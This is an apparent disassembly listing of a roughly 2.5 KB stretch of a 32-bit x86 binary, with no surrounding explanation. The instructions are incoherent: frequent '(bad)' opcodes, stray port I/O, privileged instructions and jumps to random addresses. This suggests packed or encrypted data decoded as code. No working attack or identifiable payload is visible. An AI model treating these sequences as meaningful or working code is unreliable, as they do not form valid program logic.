  42bd91:	fdivr  st,st(0)
  42bd93:	mov    dl,0x4b
  42bd95:	aas    
  42bd96:	add    dh,BYTE PTR [ebx+ecx*1-0x80]
  42bd9a:	mov    dh,0xfb
  42bd9c:	sub    dl,bh
  42bd9e:	jmp    DWORD PTR [ecx-0x6c]
  42bda1:	ror    BYTE PTR [ecx-0x41],cl
  42bda4:	ficom  WORD PTR [esi+0x5fab085d]
  42bdaa:	add    BYTE PTR [eax-0x32],bl
  42bdad:	add    edi,DWORD PTR [ebp-0x14]
  42bdb0:	pop    esp
  42bdb1:	or     DWORD PTR [ebx+0x45],esi
  42bdb4:	add    eax,0xf2085a07
  42bdb9:	sub    edi,esp
  42bdbb:	cs jecxz 0x42bdbd
  42bdbe:	mov    eax,ds:0x2910550e
  42bdc3:	add    al,0x90
  42bdc5:	mov    edi,0x6ad6271d
  42bdca:	loope  0x42bda7
  42bdcc:	mov    edx,0x8ae8828a
  42bdd1:	out    dx,eax
  42bdd2:	fs icebp 
  42bdd4:	inc    ecx
  42bdd5:	sbb    ah,BYTE PTR [esi+0x66]
  42bdd8:	add    DWORD PTR [eax],eax
  42bdda:	cmc    
  42bddb:	and    ebx,DWORD PTR [eax+0x2b53653a]
  42bde1:	cld    
  42bde2:	pop    ecx
  42bde3:	outs   dx,BYTE PTR ds:[esi]
  42bde4:	or     DWORD PTR [esi-0x1b],edx
  42bde7:	call   0xe8cb604
  42bdec:	sub    eax,0x8803a910
  42bdf1:	mov    edi,0xfbb4
	...
  42be12:	(bad)  
  42be14:	out    0x5c,al
  42be16:	or     eax,0x66f1f600
  42be1b:	push   0xfffffff1
  42be1d:	call   0x4438ba1a
  42be22:	or     eax,0x44492b75
  42be27:	mov    ebp,0x74e003e1
  42be2c:	adc    eax,0x93033184
  42be31:	push   eax
  42be32:	jmp    0xd4e1:0x95d9ae0
  42be39:	aaa    
  42be3a:	cld    
  42be3b:	aas    
  42be3c:	jmp    0xb1bedbbb
  42be41:	out    0xe2,eax
  42be43:	out    dx,eax
  42be44:	pop    ebp
  42be45:	xor    DWORD PTR [eax+0x5f54c53a],eax
  42be4b:	(bad)  
  42be4c:	sub    al,0xe0
  42be4e:	and    DWORD PTR [eax],eax
  42be50:	jmp    0x38b458
  42be55:	dec    eax
  42be56:	sbb    BYTE PTR [eax+0x0],al
  42be59:	ret    0x86fd
  42be5c:	inc    ebp
  42be5d:	cdq    
  42be5e:	ss inc ebp
  42be60:	or     BYTE PTR [eax+edx*1],dl
  42be63:	inc    ebx
  42be64:	lea    ebp,[ebp*8+0x1c8e5230]
  42be6b:	adc    DWORD PTR fs:[ecx],ebp
  42be6e:	or     DWORD PTR [ebp+0x32d6f4c0],eax
  42be74:	sti    
  42be75:	fadd   QWORD PTR [eax]
	...
  42be93:	add    BYTE PTR [edx+0x27e9400e],dh
  42be99:	ret    
  42be9a:	pop    ebx
  42be9b:	(bad)  
  42be9c:	popa   
  42be9d:	sahf   
  42be9e:	add    al,0xe9
  42bea0:	cmp    eax,0xb56aec87
  42bea5:	clc    
  42bea6:	dec    esi
  42bea7:	pop    esp
  42bea8:	int3   
  42bea9:	xlat   BYTE PTR ds:[ebx]
  42beaa:	push   eax
  42beab:	cli    
  42beac:	push   edi
  42bead:	dec    edi
  42beae:	or     WORD PTR [edx-0xb],si
  42beb2:	addr16 fcmovne st,st(6)
  42beb5:	dec    DWORD PTR [edi+0x2e]
  42beb8:	cld    
  42beb9:	das    
  42beba:	adc    BYTE PTR [ecx-0x6b3f7af2],ch
  42bec0:	or     BYTE PTR [ebp+0x65b91145],cl
  42bec6:	and    BYTE PTR [ebx-0x4eea24cd],al
  42becc:	push   ds
  42becd:	inc    eax
  42bece:	add    BYTE PTR [ecx+edx*2+0x55],ah
  42bed2:	add    al,0xbb
  42bed4:	dec    esi
  42bed5:	out    0x4c,eax
  42bed7:	pop    esp
  42bed8:	int3   
  42bed9:	jmp    0x42bf2b
  42bedb:	out    0x9d,al
  42bedd:	pop    es
  42bede:	ret    
  42bedf:	and    al,0x39
  42bee1:	add    DWORD PTR [eax],eax
  42bee3:	jmp    0x25060df6
  42bee8:	std    
  42bee9:	(bad)  
  42beeb:	add    ah,dh
  42beed:	add    dh,bh
  42beef:	adc    eax,0x3ff418
  42bef4:	popa   
  42bef5:	ret    
  42bef6:	je     0x42bf19
	...
  42bf14:	add    BYTE PTR [eax],al
  42bf16:	pop    es
  42bf17:	xor    ecx,DWORD PTR [ebx-0x73]
  42bf1a:	xor    DWORD PTR [eax+edx*2-0x7b084ad],edi
  42bf21:	call   ecx
  42bf23:	bound  edx,QWORD PTR [eax]
  42bf25:	inc    eax
  42bf26:	mov    ah,0x7f
  42bf28:	shl    BYTE PTR [eax+edi*4-0x1b],0x15
  42bf2d:	or     al,0xd7
  42bf2f:	inc    edx
  42bf30:	add    BYTE PTR [ebp-0x4d05b09c],al
  42bf36:	mov    ch,0xe5
  42bf38:	jne    0x42bf32
  42bf3a:	sub    esi,eax
  42bf3c:	add    edx,DWORD PTR [ebx]
  42bf3e:	add    al,BYTE PTR fs:[edx-0x4564a03d]
  42bf45:	add    al,0x74
  42bf47:	das    
  42bf48:	sub    esp,0xffffffa5
  42bf4b:	xor    ecx,DWORD PTR [ebx-0x73]
  42bf4e:	mov    cl,0xea
  42bf50:	push   eax
  42bf51:	push   0x6c
  42bf53:	cmp    bh,dh
  42bf55:	xor    edi,edi
  42bf57:	in     eax,0x15
  42bf59:	dec    eax
  42bf5a:	fs inc edx
  42bf5c:	add    BYTE PTR [ebp-0x6b8029dc],al
  42bf62:	add    al,BYTE PTR fs:[eax]
  42bf65:	push   edi
  42bf66:	scas   eax,DWORD PTR es:[edi]
  42bf67:	daa    
  42bf68:	and    BYTE PTR [eax],dl
  42bf6a:	je     0x42bf6e
  42bf6c:	lea    eax,[ebp+0x38]
  42bf6f:	xor    DWORD PTR [ebx+0x53],ecx
  42bf72:	mov    cs,WORD PTR [ebx]
  42bf74:	div    DWORD PTR [ebp+0x1c]
  42bf77:	in     al,0xcf
  42bf79:	test   DWORD PTR [eax],eax
	...
  42bf97:	add    BYTE PTR [esi+ebp*2+0x6a],dh
  42bf9b:	jmp    DWORD PTR [ecx]
  42bf9d:	(bad)  
  42bf9e:	or     al,BYTE PTR [eax+0xd]
  42bfa1:	jmp    0x34cab826
  42bfa6:	pop    ebp
  42bfa7:	xchg   DWORD PTR [eax-0x3d],ecx
  42bfaa:	sub    DWORD PTR [edi-0x17b5b87f],edi
  42bfb0:	pushf  
  42bfb1:	inc    eax
  42bfb2:	add    al,0x0
  42bfb4:	xchg   esi,eax
  42bfb5:	xchg   edi,eax
  42bfb6:	sub    edi,ebp
  42bfb8:	pop    ecx
  42bfb9:	sbb    dh,BYTE PTR [ebx+0x45]
  42bfbc:	fst    DWORD PTR [edi]
  42bfbe:	in     eax,0x75
  42bfc0:	rcr    DWORD PTR ds:0xf4ca1956,1
  42bfc6:	jmp    0x42bfc3
  42bfc8:	fisubr DWORD PTR [esp+eax*8+0x74]
  42bfcc:	neg    DWORD PTR [ebp+0x2a]
  42bfcf:	sti    
  42bfd0:	sbb    bl,bh
  42bfd2:	adc    eax,DWORD PTR [eax+0xd]
  42bfd5:	xchg   edx,eax
  42bfd6:	shl    BYTE PTR [ebx+esi*8+0x50],0x4
  42bfdb:	ss into 
  42bfdd:	mov    ch,0x17
  42bfdf:	or     ebx,DWORD PTR [ebx+0x27]
  42bfe2:	cmp    al,0x50
  42bfe4:	mov    dh,ch
  42bfe6:	in     al,0x15
  42bfe8:	shl    DWORD PTR [esi+0x2a36003f],1
  42bfee:	jo     0x42c003
  42bff0:	xchg   bh,ah
  42bff2:	and    al,BYTE PTR [eax]
  42bff4:	sub    eax,0x96effe7
  42bff9:	cmp    bh,bh
  42bffb:	out    0x0,al
	...
  42c019:	add    BYTE PTR [edi],al
  42c01b:	mov    esp,0xe70d2fff
  42c020:	or     edi,edx
  42c022:	lea    ebp,[edx]
  42c024:	add    DWORD PTR [edx+0x35],edx
  42c027:	jb     0x42c07f
  42c029:	add    BYTE PTR ds:0x3575e47d,cl
  42c02f:	(bad)  
  42c030:	or     al,BYTE PTR [esi+edi*8]
  42c033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c034:	call   FWORD PTR [edx-0x69]
  42c037:	add    BYTE PTR [esi+0x34c14448],ah
  42c03d:	jns    0x42c060
  42c03f:	das    
  42c040:	pop    si
  42c042:	or     DWORD PTR [eax],eax
  42c044:	inc    ecx
  42c045:	int3   
  42c046:	js     0x42c088
  42c048:	jmp    0xd776e131
  42c04d:	inc    ebx
  42c04e:	or     eax,0x2d6fa983
  42c053:	push   0x4d7aa9
  42c058:	cmp    ebp,esp
  42c05a:	add    BYTE PTR [eax-0x7cf2bc09],ch
  42c060:	test   eax,0x1c8b1d6f
  42c065:	call   0xe4c52ac6
  42c06a:	fld    QWORD PTR [edx+0x12096ea9]
  42c070:	test   eax,0xec806aba
  42c075:	out    0xd,eax
  42c077:	or     eax,0xc0c4c37c
  42c07c:	mov    ah,0x78
	...
  42c09a:	add    BYTE PTR [eax],al
  42c09c:	mov    eax,ds:0xdf4b4580
  42c0a1:	adc    BYTE PTR [eax],ah
  42c0a3:	xor    BYTE PTR [edi+0x65],bh
  42c0a6:	jo     0x42c0de
  42c0a8:	jns    0x42c0c2
  42c0aa:	and    ebp,DWORD PTR [esi+0x1b]
  42c0ad:	push   0xffffffad
  42c0af:	jbe    0x42c081
  42c0b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0b2:	xchg   ebx,eax
  42c0b3:	push   ebx
  42c0b4:	repnz mov ax,0xcd0d
  42c0b9:	jmp    DWORD PTR [ebp-0x41]
  42c0bc:	add    ebp,eax
  42c0be:	lods   al,BYTE PTR ds:[esi]
  42c0bf:	fwait
  42c0c0:	sar    edi,1
  42c0c2:	call   0x518550ca
  42c0c7:	jbe    0x42c091
  42c0c9:	fcmovnb st,st(0)
  42c0cb:	outs   dx,BYTE PTR ds:[esi]
  42c0cc:	add    eax,0xa5ea0054
  42c0d1:	dec    edx
  42c0d2:	or     BYTE PTR [ebx+edx*8-0x15],bl
  42c0d6:	dec    esi
  42c0d7:	cmp    DWORD PTR [esi],ebp
  42c0d9:	push   edx
  42c0da:	or     al,0x37
  42c0dc:	mov    eax,ds:0x12e8ffff
  42c0e1:	cs push edx
  42c0e3:	aaa    
  42c0e4:	cmp    BYTE PTR [esi],ch
  42c0e6:	sti    
  42c0e7:	fdivr  QWORD PTR [esi+0xa]
  42c0ea:	inc    eax
  42c0eb:	jmp    0x3b78175
  42c0f0:	or     BYTE PTR [ebp+0x10],dl
  42c0f3:	xor    eax,0x741065d9
  42c0f8:	inc    esp
  42c0f9:	in     al,dx
  42c0fa:	push   eax
  42c0fb:	sahf   
  42c0fc:	xor    al,0xf0
  42c0fe:	out    0x86,eax
	...
  42c11c:	add    BYTE PTR [eax],al
  42c11e:	cmp    DWORD PTR [eax],eax
  42c120:	add    BYTE PTR [edx+0x7975d6b9],al
  42c126:	mov    dl,BYTE PTR ds:0x4eda04
  42c12c:	sti    
  42c12d:	lahf   
  42c12e:	scas   al,BYTE PTR es:[edi]
  42c12f:	push   ebp
  42c130:	in     al,dx
  42c131:	outs   dx,BYTE PTR ds:[esi]
  42c132:	add    DWORD PTR [di+0x5d],0xffffffaa
  42c137:	fisubr DWORD PTR [esi]
  42c139:	sub    DWORD PTR [edi-0x37],ecx
  42c13c:	mov    esi,0x87350ee5
  42c141:	cmp    eax,0x74f22b47
  42c146:	les    ecx,FWORD PTR [ebx]
  42c148:	cmp    DWORD PTR [edx+eax*1-0x3bc9f0ab],esi
  42c14f:	pop    es
  42c150:	push   0x409019
  42c155:	mov    ecx,0xe9581766
  42c15a:	push   cs
  42c15b:	pop    ebx
  42c15c:	(bad)  
  42c15d:	in     eax,0x3b
  42c15f:	hlt    
  42c160:	cli    
  42c161:	xchg   esp,eax
  42c162:	adc    dl,bh
  42c164:	jne    0x42c166
  42c166:	cmp    al,0x67
  42c168:	fmul   QWORD PTR [ecx-0x17b0009c]
  42c16e:	dec    ebp
  42c16f:	pop    ss
  42c170:	add    BYTE PTR [eax],al
  42c172:	mov    bh,0xc7
  42c174:	adc    BYTE PTR [ebx],bh
  42c176:	push   0x61
  42c178:	adc    edi,edi
  42c17a:	mov    ecx,0x84582db
  42c17f:	fidiv  WORD PTR [ebp+0x10]
	...
  42c19e:	add    BYTE PTR [eax],al
  42c1a0:	shl    DWORD PTR [edi],cl
  42c1a2:	or     al,0xe8
  42c1a4:	hlt    
  42c1a5:	(bad)  
  42c1a7:	push   DWORD PTR [ebx-0x5b74f3c9]
  42c1ad:	out    0x41,al
  42c1af:	push   0xc682fef4
  42c1b4:	push   edx
  42c1b5:	inc    ecx
  42c1b6:	mov    edx,0x8317e414
  42c1bb:	in     al,dx
  42c1bc:	aaa    
  42c1bd:	jmp    0x42c227
  42c1bf:	push   edi
  42c1c0:	out    0xdd,eax
  42c1c2:	push   0x3f3dec
  42c1c7:	mov    DWORD PTR [ecx-0x5bea0852],esi
  42c1cd:	aam    0x3b
  42c1cf:	add    BYTE PTR ds:0xeb3bf448,ch
  42c1d5:	in     eax,dx
  42c1d6:	add    ebp,0xffffffa4
  42c1d9:	(bad)  
  42c1da:	call   DWORD PTR [edx-0x36]
  42c1dd:	mov    DWORD PTR ds:0x3e86a8,esi
  42c1e3:	push   0x408bcc
  42c1e8:	xchg   esp,eax
  42c1e9:	(bad)  
  42c1eb:	push   0x408c44
  42c1f0:	xor    edi,DWORD PTR [eax]
  42c1f2:	hlt    
  42c1f3:	mov    ecx,esp
  42c1f5:	(bad)  
  42c1f7:	mov    DWORD PTR [ecx+0xddf33ea],ebp
  42c1fd:	loop   0x42c182
  42c1ff:	(bad)  
  42c200:	or     eax,0x36ffe9
	...
  42c221:	add    BYTE PTR [edx-0x2f],dl
  42c224:	add    DWORD PTR [edi+0x52ffe90d],0x2a
  42c22b:	pop    ebx
  42c22c:	pop    es
  42c22d:	(bad)  
  42c22e:	enter  0x2ed0,0x89
  42c232:	cwde   
  42c233:	loopne 0x42c216
  42c235:	iret   
  42c236:	mov    BYTE PTR [eax+0x3495ff53],ch
  42c23c:	fsub   QWORD PTR [esi+0x49]
  42c23f:	sub    DWORD PTR ds:0x874963c0,edx
  42c245:	inc    ebp
  42c246:	icebp  
  42c247:	ins    BYTE PTR es:[edi],dx
  42c248:	inc    ebx
  42c249:	cwde   
  42c24a:	inc    edx
  42c24b:	mul    eax
  42c24d:	adc    eax,0x3fb13d
  42c252:	xchg   BYTE PTR [eax+edx*1],dl
  42c255:	jg     0x42c220
  42c257:	jmp    0x42c1df
  42c259:	jne    0x42c200
  42c25b:	pusha  
  42c25c:	pop    ebx
  42c25d:	mov    al,ds:0xff537a06
  42c262:	mov    DWORD PTR [eax+eiz*8],edx
  42c265:	lea    ecx,[eax+0x7b]
  42c268:	xor    al,0x8d
  42c26a:	push   eax
  42c26b:	das    
  42c26c:	xor    al,0x87
  42c26e:	dec    eax
  42c26f:	dec    edi
  42c270:	cmp    DWORD PTR [eax-0x5e],edx
  42c273:	aas    
  42c274:	std    
  42c275:	mov    edi,0x3e6e8
  42c27a:	or     eax,0xdffffe4
  42c27f:	jecxz  0x42c2b0
  42c281:	push   ebx
  42c282:	loop   0x42c2fd
  42c284:	cs push ebx
	...
  42c2a2:	add    BYTE PTR [eax],al
  42c2a4:	jb     0x42c23a
  42c2a6:	pop    es
  42c2a7:	sti    
  42c2a8:	add    BYTE PTR [edi-0x11],ch
  42c2ab:	aas    
  42c2ac:	or     eax,0x374c464
  42c2b1:	add    BYTE PTR [edx],ah
  42c2b3:	push   edi
  42c2b4:	ins    DWORD PTR es:[edi],dx
  42c2b5:	test   esp,edx
  42c2b7:	pop    es
  42c2b8:	sbb    al,BYTE PTR [eax-0x17]
  42c2bb:	loopne 0x42c31c
  42c2bd:	fst    DWORD PTR [edi+edi*4+0x476eb236]
  42c2c4:	sub    DWORD PTR [edi+0x5ae4d3a4],eax
  42c2ca:	icebp  
  42c2cb:	push   edi
  42c2cc:	psubusw mm6,QWORD PTR [ebx+ebx*8+0x16]
  42c2d1:	xor    edx,ebp
  42c2d3:	loopne 0x42c26d
  42c2d5:	rcr    edx,cl
  42c2d7:	test   dl,0xed
  42c2da:	sub    BYTE PTR [edi+eiz*2],al
  42c2dd:	xor    eax,0x38fd465e
  42c2e2:	mov    al,0xc5
  42c2e4:	add    eax,0x11496e00
  42c2e9:	xor    DWORD PTR [esi+0x1e],ebx
  42c2ec:	or     ebp,ebp
  42c2ee:	sub    BYTE PTR [eax+edx*4],al
  42c2f1:	mov    edi,0xd93d051d
  42c2f6:	mov    dl,0x8c
  42c2f8:	jae    0x49051aa7
  42c2fe:	mov    bh,BYTE PTR [eax-0x13e50fcd]
  42c304:	pop    ss
  42c305:	push   0x3e9
	...
  42c326:	inc    esi
  42c327:	mov    ebp,0x8ab18d1c
  42c32c:	and    al,0xf4
  42c32e:	dec    edx
  42c32f:	jmpw   0xdc13
  42c333:	lock pop ecx
  42c335:	push   esi
  42c336:	sbb    ecx,ebx
  42c338:	fmul   QWORD PTR [ebx]
  42c33a:	jmp    0x42c33b
  42c33c:	dec    ecx
  42c33d:	not    BYTE PTR [esi-0x77fc5713]
  42c343:	mov    edi,0xd8bd0fb5
  42c348:	add    ah,bl
  42c34a:	or     cl,BYTE PTR [ecx]
  42c34c:	inc    eax
  42c34d:	jmp    0x125305db
  42c352:	or     BYTE PTR [ecx],ch
  42c354:	sar    BYTE PTR [eax+edx*2-0x6e43fff5],0xeb
  42c35c:	cmp    ebp,0xe9fbd8df
  42c362:	hlt    
  42c363:	sub    al,0x8d
  42c365:	fs dec edx
  42c367:	aad    0xfb
  42c369:	neg    bh
  42c36b:	aam    0x75
  42c36d:	loope  0x42c39c
  42c36f:	repnz (bad) 
  42c371:	std    
  42c372:	into   
  42c373:	dec    DWORD PTR [esp+eiz*2-0x29042513]
  42c37a:	cmp    DWORD PTR [eax],esi
  42c37c:	push   0x408701
  42c381:	xchg   BYTE PTR [ebp-0x2a],bh
  42c384:	sti    
  42c385:	jmp    0xb5d35107
	...
  42c3a6:	add    BYTE PTR [eax],al
  42c3a8:	ret    0xe8db
  42c3ab:	and    BYTE PTR [ebx],ah
  42c3ad:	add    BYTE PTR [eax],al
  42c3af:	push   0xffffffc5
  42c3b1:	add    al,0x5b
  42c3b3:	aas    
  42c3b4:	xchg   esp,eax
  42c3b5:	sar    BYTE PTR [edx-0x3],0x9d
  42c3b9:	jge    0x42c34b
  42c3bb:	(bad)  
  42c3bc:	fcmovu st,st(3)
  42c3be:	push   eax
  42c3bf:	xchg   ecx,eax
  42c3c0:	add    eax,DWORD PTR [eax]
  42c3c2:	add    cl,ch
  42c3c4:	xchg   edx,eax
  42c3c5:	shl    BYTE PTR [ebp+ebp*8+0x7e],0x1
  42c3ca:	out    0xeb,eax
  42c3cc:	cld    
  42c3cd:	mov    edi,0x52bc9
  42c3d2:	push   ebp
  42c3d3:	jb     0x42c452
  42c3d5:	sub    esp,0x15c5
  42c3db:	mov    edx,0x858543
  42c3e0:	lock loopne 0x42c3da
  42c3e3:	inc    DWORD PTR [ebx+ebp*2+0x3b48a4c]
  42c3ea:	call   0x3ef516
  42c3ef:	and    DWORD PTR [edi+eax*1],0xffffff84
  42c3f3:	out    dx,eax
  42c3f4:	xor    al,0x3
  42c3f6:	add    BYTE PTR [ebp-0x3944f],cl
  42c3fc:	or     ecx,DWORD PTR [ecx*4-0x81f0f7b]
  42c403:	inc    DWORD PTR [esi+esi*4+0x4340c815]
  42c40a:	add    BYTE PTR [ebp+0x0],cl
	...
  42c428:	add    BYTE PTR [eax],al
  42c42a:	mov    cl,0x6b
  42c42c:	cld    
  42c42d:	jmp    FWORD PTR [ebx]
  42c42f:	adc    esi,edi
  42c431:	jne    0x42c42f
  42c433:	outs   dx,DWORD PTR ds:[esi]
  42c434:	inc    ebp
  42c435:	or     BYTE PTR [eax+ebx*1-0x7e],cl
  42c439:	inc    eax
  42c43a:	in     al,0x12
  42c43c:	call   0x3ed6cd
  42c441:	xor    BYTE PTR [eax-0x6407852e],0x5
  42c448:	test   BYTE PTR [ebx+0x500002e4],ch
  42c44e:	stos   DWORD PTR es:[edi],eax
  42c44f:	aaa    
  42c450:	or     BYTE PTR [ebp-0x290cf],cl
  42c456:	fwait
  42c457:	adc    ch,al
  42c459:	scas   eax,DWORD PTR es:[edi]
  42c45a:	add    al,BYTE PTR [bx+si]
  42c45d:	push   DWORD PTR [ecx+0x7cd8820a]
  42c463:	sbb    al,0x5e
  42c465:	add    BYTE PTR [esi+edi*2-0x7bcff02d],dh
  42c46c:	add    BYTE PTR [eax],al
  42c46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c46f:	outs   dx,DWORD PTR ds:[esi]
  42c470:	test   DWORD PTR [ecx+ebp*8+0xd50f7b5],esi
  42c477:	rcl    DWORD PTR [ebx-0x7a],0xcd
  42c47b:	call   0xe94ecf16
  42c480:	dec    DWORD PTR [eax+ebp*4+0x62fbd92c]
  42c487:	inc    eax
  42c488:	inc    esp
  42c489:	push   ebp
  42c48a:	or     eax,0x593ce9
	...
  42c4ab:	add    BYTE PTR [esi-0x4c8525e0],cl
  42c4b1:	jo     0x42c4b6
  42c4b3:	add    DWORD PTR ds:0x818590e9,ecx
  42c4b9:	add    ebx,edx
  42c4bb:	sti    
  42c4bc:	fnsave [eax-0x7d]
  42c4bf:	xchg   ch,cl
  42c4c1:	call   0xb803daa0
  42c4c6:	aas    
  42c4c7:	add    ch,al
  42c4c9:	mov    ds:0xe90d0101,eax
  42c4ce:	push   esp
  42c4cf:	inc    ebx
  42c4d0:	ja     0x42c4ed
  42c4d2:	adc    ebx,edi
  42c4d4:	nop
  42c4d5:	and    al,0xa0
  42c4d7:	push   ebx
  42c4d8:	pop    ebp
  42c4d9:	(bad)  
  42c4da:	repz dec edi
  42c4dc:	sbb    esp,DWORD PTR [edi]
  42c4de:	add    al,0x7f
  42c4e0:	shl    ebx,1
  42c4e2:	adc    al,al
  42c4e4:	imul   esp,DWORD PTR [eax+0x43],0xffffffec
  42c4e8:	inc    edx
  42c4e9:	xor    al,0x43
  42c4eb:	mov    esp,0x858b163d
  42c4f0:	mov    eax,ds:0x5dfbdda1
  42c4f5:	pop    esp
  42c4f6:	xor    DWORD PTR [eax+edi*4-0x35af227a],0x24
  42c4fe:	mov    al,ds:0xffe70d44
  42c503:	ret    0x7f48
  42c506:	(bad)  
  42c507:	dec    DWORD PTR ds:0x9008e7e7
  42c50d:	add    BYTE PTR [edx-0x23],ah
	...
  42c52c:	add    BYTE PTR [eax],al
  42c52e:	jle    0x42c4e8
  42c530:	inc    bl
  42c532:	jle    0x42c4ec
  42c534:	ds push cs
  42c536:	mov    BYTE PTR [ebx-0x6b],bh
  42c539:	fbstp  TBYTE PTR [esi-0x2b]
  42c53c:	cdq    
  42c53d:	jmp    0x42c5a8
  42c53f:	pop    es
  42c540:	cmp    bl,ch
  42c542:	xor    eax,eax
  42c544:	xchg   edx,eax
  42c545:	cmp    BYTE PTR [edx+eax*8-0x1b],al
  42c549:	add    edi,DWORD PTR [esi-0x4022dd97]
  42c54f:	jmp    0x42c56a
  42c551:	mul    DWORD PTR [esi]
  42c553:	icebp  
  42c554:	test   al,0x3
  42c556:	xchg   edx,eax
  42c557:	ds stc 
  42c559:	mov    BYTE PTR [ebp+0x8],dh
  42c55c:	call   0xadcbd264
  42c561:	daa    
  42c562:	adc    eax,0xc106187
  42c567:	add    cl,ch
  42c569:	mov    bh,cl
  42c56b:	out    dx,eax
  42c56c:	dec    edx
  42c56d:	mov    DWORD PTR [ecx+0x1c],ebx
  42c570:	in     eax,dx
  42c571:	mov    ah,BYTE PTR [ebp+0xd03e807]
  42c577:	mov    DWORD PTR [ebx],esp
  42c579:	hlt    
  42c57a:	ins    BYTE PTR es:[edi],dx
  42c57b:	xchg   DWORD PTR [ecx-0xd],esi
  42c57e:	or     eax,0x5fdce900
  42c583:	in     al,dx
  42c584:	mov    cl,0xf6
  42c586:	adc    dh,cl
  42c588:	sub    BYTE PTR [esi+edi*1],al
  42c58b:	aad    0xfc
  42c58d:	jecxz  0x42c5b0
  42c58f:	inc    eax
  42c590:	jmp    0x42c61b
	...
  42c5ad:	add    BYTE PTR [eax],al
  42c5af:	add    ch,cl
  42c5b1:	dec    ebx
  42c5b2:	repz xor dl,ch
  42c5b5:	mov    edi,0x2186c39
  42c5ba:	jmp    0x255b03c2
  42c5bf:	sub    ch,ch
  42c5c1:	dec    ebx
  42c5c2:	add    cl,ah
  42c5c4:	mov    ecx,0x4edaebea
  42c5c9:	add    bh,ah
  42c5cb:	out    dx,eax
  42c5cc:	imul   ebp,edx,0xffcef5e7
  42c5d2:	xchg   BYTE PTR [esi],ch
  42c5d4:	cmp    DWORD PTR [esi+0x7d3be90c],edx
  42c5da:	in     al,dx
  42c5db:	push   0x7a
  42c5dd:	repz dec esi
  42c5df:	xchg   edi,eax
  42c5e0:	sbb    DWORD PTR [ebp-0x12],edi
  42c5e3:	ret    
  42c5e4:	cmp    eax,ebx
  42c5e6:	jb     0x42c5bd
  42c5e8:	test   DWORD PTR [edi-0x1596df79],esi
  42c5ee:	sbb    edi,edx
  42c5f0:	into   
  42c5f1:	inc    DWORD PTR [esi-0x7782c151]
  42c5f7:	loope  0x42c608
  42c5f9:	add    BYTE PTR [eax],al
  42c5fb:	test   BYTE PTR [ecx+0xee8107f],0x0
  42c602:	sti    
  42c603:	jg     0x42c627
  42c605:	xchg   DWORD PTR [ebp-0x13],ecx
  42c608:	test   BYTE PTR [edx],bh
  42c60a:	clc    
  42c60b:	out    0xfc,al
  42c60d:	sti    
  42c60e:	push   cs
  42c60f:	sub    DWORD PTR [ecx],ecx
  42c611:	test   DWORD PTR [ebp-0x3f],eax
	...
  42c630:	add    BYTE PTR [eax],al
  42c632:	inc    ecx
  42c633:	xlat   BYTE PTR ds:[ebx]
  42c634:	jne    0x42c603
  42c636:	(bad)  
  42c637:	in     eax,dx
  42c638:	(bad)  
  42c63a:	dec    esi
  42c63b:	add    BYTE PTR [ebp-0x3583e957],al
  42c641:	jmp    0x6aa4c654
  42c646:	xor    al,0xd8
  42c648:	(bad)  
  42c649:	sbb    eax,esp
  42c64b:	jp     0x42c6bf
  42c64d:	stc    
  42c64e:	repz xchg ebp,eax
  42c650:	add    al,ch
  42c652:	push   cs
  42c653:	add    BYTE PTR [edi],ah
  42c655:	outs   dx,DWORD PTR ds:[esi]
  42c656:	or     eax,0xb4000001
  42c65b:	cld    
  42c65c:	jl     0x42c646
  42c65e:	mov    ch,0x18
  42c660:	in     al,dx
  42c661:	add    DWORD PTR [ecx+0x185d01af],esp
  42c667:	jecxz  0x42c6af
  42c669:	bts    DWORD PTR [ecx-0x8],eax
  42c66d:	sub    esp,0x8
  42c670:	ja     0x42c68e
  42c672:	pop    eax
  42c673:	rol    BYTE PTR [ebx+0x48],1
  42c676:	pop    eax
  42c677:	int3   
  42c678:	inc    ebx
  42c679:	dec    eax
  42c67a:	test   al,0x1f
  42c67c:	jnp    0x42c666
  42c67e:	push   0x43
  42c680:	push   ds
  42c681:	dec    eax
  42c682:	cwde   
  42c683:	rol    BYTE PTR [ebx+0x75],cl
  42c686:	push   esp
  42c687:	loop   0x42c6ac
  42c689:	mov    DWORD PTR [ecx-0x19],esi
  42c68c:	jecxz  0x42c6b4
  42c68e:	mov    bh,0xe3
  42c690:	push   es
  42c691:	je     0x42c6d5
  42c693:	inc    edi
  42c694:	je     0x42c6ac
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	ins    BYTE PTR es:[edi],dx
  42c6b5:	inc    ebx
  42c6b6:	add    ecx,DWORD PTR [eax-0x57]
  42c6b9:	ror    DWORD PTR [eax+0x7d84185d],1
  42c6bf:	lock bswap ebx
  42c6c2:	mov    BYTE PTR [ebp+0x18],bl
  42c6c5:	test   BYTE PTR [ebp-0x18],bh
  42c6c8:	fild   WORD PTR [ecx]
  42c6ca:	mov    DWORD PTR [ebp-0x28],ebx
  42c6cd:	loope  0x42c6cd
  42c6cf:	mov    BYTE PTR [ecx-0x54],ah
  42c6d2:	mov    DWORD PTR [ebp-0x50],ebx
  42c6d5:	xchg   DWORD PTR [ebp-0x18],eax
  42c6d8:	add    al,0xb7
  42c6da:	adc    eax,0x3eb8f8
  42c6df:	test   DWORD PTR [edi+ebp*1-0x4a6b95ba],esp
  42c6e6:	jne    0x42c6e4
  42c6e8:	jae    0x42c6b9
  42c6ea:	pop    es
  42c6eb:	adc    eax,0xa8fbf4
  42c6f0:	or     eax,0x393fffe9
  42c6f5:	shr    DWORD PTR [ebp-0x2],1
  42c6f8:	cdq    
  42c6f9:	and    ebp,esp
  42c6fb:	push   eax
  42c6fc:	mov    ds:0xfbd3cb,al
  42c701:	pop    ecx
  42c702:	repnz aas 
  42c704:	or     eax,0x8a0069f9
  42c709:	shl    ebx,cl
  42c70b:	adc    al,0xcd
  42c70d:	call   0xfdc40c9c
  42c712:	inc    eax
  42c713:	in     al,dx
  42c714:	in     eax,0xb4
  42c716:	bound  eax,QWORD PTR [eax]
	...
  42c734:	add    BYTE PTR [eax],al
  42c736:	or     eax,0x5d458a79
  42c73b:	in     eax,dx
  42c73c:	inc    eax
  42c73d:	call   0xec92d0ff
  42c742:	push   edx
  42c743:	mov    esp,edi
  42c745:	or     ax,0x501a
  42c749:	cld    
  42c74a:	inc    edx
  42c74b:	retf   
  42c74c:	mov    bh,0x14
  42c74e:	int    0xe8
  42c750:	ss pop edx
  42c752:	(bad)  
  42c753:	pop    ds
  42c754:	ret    0x9655
